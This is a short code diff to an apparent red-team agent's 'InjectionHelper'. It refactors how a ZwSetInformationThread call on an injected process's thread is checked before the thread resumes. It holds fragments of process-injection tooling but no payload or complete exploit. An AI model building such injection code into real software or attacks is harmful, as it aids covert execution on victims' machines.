@@ -122,11 +122,7 @@ namespace RedPeanutAgent.Execution
                 return false;
             }
 
-            IntPtr infoth = InjectionHelper.SetInformationThread(procInfo);
-            if (infoth == IntPtr.Zero)
-            {
-                return false;
-            }
+            InjectionHelper.SetInformationThread(procInfo);
 
             InjectionHelper.ResumeThread(procInfo);
 
@@ -190,11 +186,7 @@ namespace RedPeanutAgent.Execution
                 return false;
             }
 
-            IntPtr infoth = InjectionHelper.SetInformationThread(procInfo);
-            if (infoth == IntPtr.Zero)
-            {
-                return false;
-            }
+            InjectionHelper.SetInformationThread(procInfo);
 
             InjectionHelper.ResumeThread(procInfo);
 
@@ -270,12 +262,14 @@ namespace RedPeanutAgent.Execution
             return true;
         }
 
-        public static IntPtr SetInformationThread(Natives.PROCESS_INFORMATION procInfo)
+        public static bool SetInformationThread(Natives.PROCESS_INFORMATION procInfo)
         {
             IntPtr th = procInfo.hThread;
-            IntPtr infoth = Natives.ZwSetInformationThread(th, 1, IntPtr.Zero, 0);
-
-            return infoth;
+            if (Natives.ZwSetInformationThread(th, (uint)Natives.SYSTEM_INFORMATION_CLASS.SystemProcessorInformation, IntPtr.Zero, 0) != 0)
+            {
+                return false;
+            }
+            return true;
         }
 
         public static int ResumeThread(Natives.PROCESS_INFORMATION procInfo)
